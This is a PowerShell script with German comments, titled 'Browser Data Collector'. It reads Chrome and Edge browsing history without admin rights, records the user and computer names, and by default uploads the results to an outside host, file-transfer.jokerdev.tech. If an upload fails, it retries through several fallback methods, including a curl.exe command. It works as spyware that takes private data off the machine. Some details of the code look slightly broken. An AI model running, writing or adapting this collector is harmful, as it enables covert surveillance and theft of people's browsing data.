<#
.SYNOPSIS
    Browser Data Collector mit automatischem Upload
    
.DESCRIPTION
    Sammelt Browser-History von Chrome, Edge und Firefox und lädt sie hoch.
    Kann ohne Admin-Rechte ausgeführt werden.
    
.PARAMETER OutputDir
    Verzeichnis für Ausgabedateien (Standard: $env:TEMP)
    
.PARAMETER UploadEnabled
    Aktiviert/Deaktiviert den automatischen Upload
    
.PARAMETER UploadUrl
    Ziel-URL für den Upload (Standard: file-transfer.jokerdev.tech)
    
.PARAMETER DryRun
    Simuliert die Ausführung ohne tatsächlichen Upload
    
.EXAMPLE
    .\BrowserDataCollector.ps1
    
.EXAMPLE
    .\BrowserDataCollector.ps1 -UploadEnabled:$false -OutputDir "C:\Temp"
    
.NOTES
    Version: 2.0
    Author: PowerShell Script
#>

[CmdletBinding()]
param(
    [string]$OutputDir = $env:TEMP,
    [bool]$UploadEnabled = $true,
    [string]$UploadUrl = "https://file-transfer.jokerdev.tech/upload",
    [switch]$DryRun
)

Set-StrictMode -Version Latest
$ErrorActionPreference = 'Stop'

#region Globale Variablen
$script:StartTime = Get-Date
$script:Results = @{
    TotalUrls = 0
    ProcessedBrowsers = @()
    Errors = @()
}
$script:CollectedUrls = [System.Collections.Generic.HashSet[string]]::new(StringComparer.OrdinalIgnoreCase)
#endregion

#region Hilfsfunktionen
function Write-Log {
    param(
        [string]$Message,
        [ValidateSet('Info', 'Success', 'Warning', 'Error', 'Verbose')]
        [string]$Level = 'Info'
    )
    
    $colorMap = @{
        Info    = 'Gray'
        Success = 'Green'
        Warning = 'Yellow'
        Error   = 'Red'
        Verbose = 'DarkGray'
    }
    
    $timestamp = Get-Date -Format 'HH:mm:ss'
    $formattedMessage = "[$timestamp] $Message"
    
    if ($Level -eq 'Verbose') {
        Write-Verbose $formattedMessage
    } else {
        Write-Host $formattedMessage -ForegroundColor $colorMap[$Level]
    }
}

function Test-ValidUrl {
    param([string]$Url)
    
    # Basis-Validierung
    if ([string]::IsNullOrWhiteSpace($Url)) { return $false }
    if ($Url.Length -lt 10) { return $false }
    
    # Schema-Prüfung
    if ($Url -notmatch '^https?://') { return $false }
    
    # Keine Browser-interne URLs
    if ($Url -match '^(chrome|edge|opera|about|file|data|javascript):') { return $false }
    
    # Keine Sonderzeichen
    if ($Url -match '[^\x20-\x7E]') { return $false }
    
    # Keine Dateipfade oder lokale Adressen
    if ($Url -match '\/\$|localhost|127\.0\.0\.1|\.local') { return $false }
    
    # Domain-Prüfung (optional, kann angepasst werden)
    if ($Url -notmatch '\.(com|org|net|de|info|io|tv|me|uk|fr|es|it|ru|ch|at|edu|gov|mil|int)(:\d+)?(\/|$)') {
        Write-Verbose "URL nicht in TLD-Whitelist: $Url"
        # return $false  # Optional: TLD-Filter deaktivieren
    }
    
    return $true
}

function Extract-UrlsFromBinary {
    param(
        [string]$SourcePath,
        [string]$BrowserName
    )
    
    $tempFile = $null
    $extractedCount = 0
    
    try {
        Write-Log "Verarbeite $BrowserName: $SourcePath" -Level Verbose
        
        # Temporäre Kopie erstellen
        $tempGuid = [guid]::NewGuid().ToString()
        $tempFile = Join-Path $env:TEMP "bdc_${BrowserName}_$tempGuid.tmp"
        
        Copy-Item -Path $SourcePath -Destination $tempFile -Force -ErrorAction Stop
        Write-Log "Datei kopiert: $(Split-Path $SourcePath -Leaf)" -Level Verbose
        
        # Dateiinhalt lesen und parsen
        $fileBytes = [System.IO.File]::ReadAllBytes($tempFile)
        $fileText = [System.Text.Encoding]::UTF8.GetString($fileBytes)
        
        # URL-Extraktion mit verbessertem Regex
        $urlPattern = 'https?://(?:[-\w]+\.)+[-\w]+(?::\d+)?(?:/[^\s""<>]*)?'
        $urlMatches = [regex]::Matches($fileText, $urlPattern, 'IgnoreCase')
        
        Write-Log "Gefundene Kandidaten: $($urlMatches.Count)" -Level Verbose
        
        foreach ($match in $urlMatches) {
            $url = $match.Value.Trim()
            
            if (Test-ValidUrl -Url $url) {
                if ($script:CollectedUrls.Add($url)) {
                    $extractedCount++
                }
            }
        }
        
        Write-Log "$BrowserName: $extractedCount neue URLs extrahiert" -Level Success
        return $extractedCount
    }
    catch {
        $errorMsg = "Fehler bei $BrowserName: $_"
        Write-Log $errorMsg -Level Error
        $script:Results.Errors += $errorMsg
        return 0
    }
    finally {
        # Temporäre Dateien immer bereinigen
        if ($tempFile -and (Test-Path $tempFile)) {
            Remove-Item -Path $tempFile -Force -ErrorAction SilentlyContinue
            Write-Log "Temp-Datei gelöscht: $(Split-Path $tempFile -Leaf)" -Level Verbose
        }
    }
}

function Get-BrowserHistoryPaths {
    @(
        @{
            Name = 'Chrome'
            Paths = @("$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History")
            Active = $true
        }
        @{
            Name = 'Edge'
            Paths = @("$env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\History")
            Active = $true
        }
        @{
            Name = 'Firefox'
            Paths = @(Get-ChildItem "$env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\" -Directory -ErrorAction SilentlyContinue | 
                      ForEach-Object { Join-Path $_.FullName "places.sqlite" } |
                      Where-Object { Test-Path $_ })
            Active = $false  # Deaktiviert wegen unzuverlässiger Extraktion
            Comment = "Firefox-SQLite-Daten können fehlerhafte Ergebnisse liefern"
        }
        # Weitere Browser können hier hinzugefügt werden
    )
}
#endregion

#region Hauptfunktionen
function Invoke-BrowserDataCollection {
    Write-Log "=== Browser Data Collector v2.0 ===" -Level Info
    Write-Log "Startzeit: $($script:StartTime.ToString('yyyy-MM-dd HH:mm:ss'))" -Level Info
    Write-Log "Benutzer: $env:USERNAME, Computer: $env:COMPUTERNAME" -Level Info
    
    if ($DryRun) {
        Write-Log "TROCKENLAUF - keine Daten werden gespeichert/hochgeladen" -Level Warning
    }
    
    # Browser-Definitionen abrufen
    $browsers = Get-BrowserHistoryPaths
    
    foreach ($browser in $browsers) {
        if (-not $browser.Active) {
            Write-Log "Browser $($browser.Name) ist deaktiviert: $($browser.Comment)" -Level Warning
            continue
        }
        
        Write-Log "Verarbeite $($browser.Name)..." -Level Info
        
        foreach ($historyPath in $browser.Paths) {
            if (Test-Path $historyPath) {
                $count = Extract-UrlsFromBinary -SourcePath $historyPath -BrowserName $browser.Name
                $script:Results.TotalUrls += $count
                $script:Results.ProcessedBrowsers += "$($browser.Name): $count URLs"
            }
            else {
                Write-Log "Pfad nicht gefunden: $historyPath" -Level Verbose
            }
        }
    }
}

function Save-Results {
    param([string]$OutputDirectory)
    
    # Ausgabeverzeichnis erstellen
    if (-not (Test-Path $OutputDirectory)) {
        New-Item -ItemType Directory -Path $OutputDirectory -Force | Out-Null
    }
    
    $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
    $outputFile = Join-Path $OutputDirectory "browser_urls_$timestamp.txt"
    
    # URLs sortiert speichern
    $sortedUrls = $script:CollectedUrls | Sort-Object
    
    if ($DryRun) {
        Write-Log "TROCKENLAUF: Würde speichern nach: $outputFile" -Level Info
        Write-Log "TROCKENLAUF: $($sortedUrls.Count) URLs" -Level Info
        return $outputFile
    }
    
    $sortedUrls | Out-File -FilePath $outputFile -Encoding UTF8
    Write-Log "Ergebnisse gespeichert: $outputFile" -Level Success
    
    # Metadaten als JSON speichern
    $metadata = @{
        CollectionTime = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'
        User = $env:USERNAME
        Computer = $env:COMPUTERNAME
        TotalUrls = $sortedUrls.Count
        ProcessedBrowsers = $script:Results.ProcessedBrowsers
        Errors = $script:Results.Errors
        ScriptVersion = '2.0'
    }
    
    $metadataFile = Join-Path $OutputDirectory "collection_metadata_$timestamp.json"
    $metadata | ConvertTo-Json | Out-File -FilePath $metadataFile -Encoding UTF8
    
    return $outputFile
}

# Korrigierte Upload-Funktion

function Invoke-FileUpload {
    param(
        [string]$FilePath,
        [string]$TargetUrl,
        [bool]$DryRunMode
    )
    
    if ($DryRunMode) {
        Write-Log "TROCKENLAUF: Würde hochladen nach: $TargetUrl" -Level Info
        return $true
    }
    
    if (-not (Test-Path $FilePath)) {
        Write-Log "Datei nicht gefunden: $FilePath" -Level Error
        return $false
    }
    
    try {
        Write-Log "Starte Upload nach: $TargetUrl" -Level Info
        
        # Methode 1: Invoke-RestMethod (empfohlen für PowerShell)
        Write-Log "Verwende Invoke-RestMethod..." -Level Verbose
        
        $fileName = Split-Path $FilePath -Leaf
        $fileBytes = [System.IO.File]::ReadAllBytes($FilePath)
        
        $uploadUri = if ($TargetUrl.EndsWith('/')) {
            "${TargetUrl}${fileName}"
        } else {
            "${TargetUrl}/${fileName}"
        }
        
        Invoke-RestMethod -Uri $uploadUri -Method Put -Body $fileBytes `
            -ContentType "application/octet-stream" -ErrorAction Stop
        
        Write-Log "Upload erfolgreich!" -Level Success
        return $true
    }
    catch {
        Write-Log "Invoke-RestMethod fehlgeschlagen: $_" -Level Error
        
        # Methode 2: WebClient (Fallback)
        try {
            Write-Log "Versuche WebClient-Methode..." -Level Warning
            
            $webClient = New-Object System.Net.WebClient
            $webClient.UploadFile($uploadUri, $FilePath)
            
            Write-Log "WebClient Upload erfolgreich!" -Level Success
            return $true
        }
        catch {
            Write-Log "WebClient fehlgeschlagen: $_" -Level Error
            
            # Methode 3: natives cURL falls verfügbar
            try {
                # Prüfe ob natives cURL (curl.exe) vorhanden ist
                $nativeCurl = Get-Command "curl.exe" -ErrorAction SilentlyContinue
                
                if ($null -ne $nativeCurl) {
                    Write-Log "Versuche natives cURL..." -Level Warning
                    
                    # Verwende curl.exe explizit mit vollständigem Pfad
                    $curlArgs = @("-T", "`"$FilePath`"", "`"$uploadUri`"")
                    Start-Process -FilePath $nativeCurl.Source -ArgumentList $curlArgs -Wait -NoNewWindow
                    
                    Write-Log "cURL Upload gestartet!" -Level Success
                    return $true
                }
                else {
                    Write-Log "cURL nicht verfügbar" -Level Verbose
                }
            }
            catch {
                Write-Log "cURL fehlgeschlagen: $_" -Level Error
            }
            
            # Methode 4: Multipart Form-Data als letzter Versuch
            try {
                Write-Log "Versuche Multipart Form-Data..." -Level Warning
                
                $boundary = [System.Guid]::NewGuid().ToString()
                $LF = "`r`n"
                
                $fileBytes = [System.IO.File]::ReadAllBytes($FilePath)
                $enc = [System.Text.Encoding]::GetEncoding("iso-8859-1")
                $fileContent = $enc.GetString($fileBytes)
                
                $bodyLines = @(
                    "--$boundary",
                    "Content-Disposition: form-data; name=`"file`"; filename=`"$fileName`"",
                    "Content-Type: application/octet-stream",
                    "",
                    $fileContent,
                    "--$boundary--"
                )
                
                $body = $bodyLines -join $LF
                
                Invoke-RestMethod -Uri $TargetUrl -Method Post -Body $body `
                    -ContentType "multipart/form-data; boundary=$boundary" -ErrorAction Stop
                
                Write-Log "Multipart Upload erfolgreich!" -Level Success
                return $true
            }
            catch {
                Write-Log "Alle Upload-Methoden fehlgeschlagen: $_" -Level Error
                
                # Manuellen Befehl anzeigen
                Write-Log "`nManueller Upload-Befehl:" -Level Warning
                Write-Log "curl.exe -T `"$FilePath`" `"$uploadUri`"" -Level Info
                
                return $false
            }
        }
    }
}

function New-Report {
    param([string]$OutputDirectory)
    
    $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
    $reportFile = Join-Path $OutputDirectory "collection_report_$timestamp.html"
    
    $htmlReport = @"
<!DOCTYPE html>
<html>
<head>
    <title>Browser Data Collection Report</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 40px; }
        h1 { color: #333; }
        .success { color: green; }
        .warning { color: orange; }
        .error { color: red; }
        .info { color: blue; }
        pre { background: #f5f5f5; padding: 10px; border-radius: 5px; }
        table { border-collapse: collapse; width: 100%; }
        th, td { border: 1px solid #ddd; padding: 8px; text-align: left; }
        th { background-color: #f2f2f2; }
    </style>
</head>
<body>
    <h1>Browser Data Collection Report</h1>
    <p><strong>Erstellt am:</strong> $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')</p>
    <p><strong>Benutzer:</strong> $env:USERNAME</p>
    <p><strong>Computer:</strong> $env:COMPUTERNAME</p>
    
    <h2>Zusammenfassung</h2>
    <table>
        <tr><th>Gesammelte URLs</th><td>$($script:CollectedUrls.Count)</td></tr>
        <tr><th>Verarbeitete Browser</th><td>$($script:Results.ProcessedBrowsers.Count)</td></tr>
        <tr><th>Fehler</th><td>$($script:Results.Errors.Count)</td></tr>
    </table>
    
    <h2>Verarbeitete Browser</h2>
    <ul>
$(($script:Results.ProcessedBrowsers | ForEach-Object { "        <li>$_</li>" }) -join "`n")
    </ul>
    
$(if ($script:Results.Errors.Count -gt 0) {
    @"
    <h2 class="error">Fehler</h2>
    <ul class="error">
$(($script:Results.Errors | ForEach-Object { "        <li>$_</li>" }) -join "`n")
    </ul>
"@
})
    
    <h2>Beispiel-URLs (max. 20)</h2>
    <pre>
$(($script:CollectedUrls | Select-Object -First 20 | ForEach-Object { $_ }) -join "`n")
    </pre>
    
    <footer>
        <p>Report generiert von Browser Data Collector v2.0</p>
    </footer>
</body>
</html>
"@
    
    $htmlReport | Out-File -FilePath $reportFile -Encoding UTF8
    Write-Log "Report erstellt: $reportFile" -Level Info
}
#endregion

#region Hauptprogramm
function Main {
    try {
        # Sammlung durchführen
        Invoke-BrowserDataCollection
        
        # Ergebnisse anzeigen
        Write-Log "`n=== ERGEBNISSE ===" -Level Info
        Write-Log "Gesammelte URLs: $($script:CollectedUrls.Count)" -Level Success
        
        if ($script:CollectedUrls.Count -gt 0) {
            Write-Log "`nBeispiele:" -Level Info
            $script:CollectedUrls | Select-Object -First 5 | ForEach-Object {
                Write-Log "  $_" -Level Verbose
            }
        }
        
        # Ergebnisse speichern
        $savedFile = Save-Results -OutputDirectory $OutputDir
        
        # Report generieren
        New-Report -OutputDirectory $OutputDir
        
        # Upload durchführen (falls aktiviert)
        $uploadSuccess = $false
        if ($UploadEnabled -and (Test-Path $savedFile)) {
            $fileName = Split-Path $savedFile -Leaf
            $fullUploadUrl = "$UploadUrl/$fileName"
            
            Write-Log "`n=== UPLOAD ===" -Level Info
            $uploadSuccess = Invoke-FileUpload -FilePath $savedFile `
                -TargetUrl $fullUploadUrl `
                -DryRunMode $DryRun
            
            if ($uploadSuccess) {
                Write-Log "Datei hochgeladen: $fileName" -Level Success
            }
        }
        
        # Zusammenfassung
        $duration = (Get-Date) - $script:StartTime
        Write-Log "`n=== ZUSAMMENFASSUNG ===" -Level Info
        Write-Log "Dauer: $($duration.TotalSeconds.ToString('0.00')) Sekunden" -Level Info
        Write-Log "Gesammelte URLs: $($script:CollectedUrls.Count)" -Level Info
        Write-Log "Upload: $(if ($uploadSuccess) { 'Erfolgreich' } else { 'Nicht durchgeführt/Fehlgeschlagen' })" -Level Info
        
        if ($DryRun) {
            Write-Log "TROCKENLAUF abgeschlossen - keine echten Änderungen vorgenommen" -Level Warning
        }
        
        return 0
    }
    catch {
        Write-Log "Kritischer Fehler: $_" -Level Error
        Write-Log "Stack Trace: $($_.ScriptStackTrace)" -Level Error
        return 1
    }
}

# Skript ausführen
exit (Main)
#endregion
